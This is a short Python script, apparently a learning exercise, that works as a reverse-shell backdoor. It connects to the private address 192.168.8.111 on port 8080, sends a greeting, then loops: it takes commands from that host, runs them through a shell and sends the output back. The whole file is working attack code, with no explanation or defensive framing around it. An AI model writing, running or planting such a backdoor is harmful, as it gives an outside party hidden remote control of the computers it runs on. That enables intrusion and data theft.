import socket
import subprocess


def command_execution(command):
    return subprocess.check_output(command, shell=True)


backdoor_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

backdoor_listener.connect(("192.168.8.111", 8080))
backdoor_listener.send(("Hello World\n").encode())

while True:
    command = backdoor_listener.recv(1024)  # byte
    cmd = command_execution(command)
    backdoor_listener.send(cmd)

backdoor_listener.close()
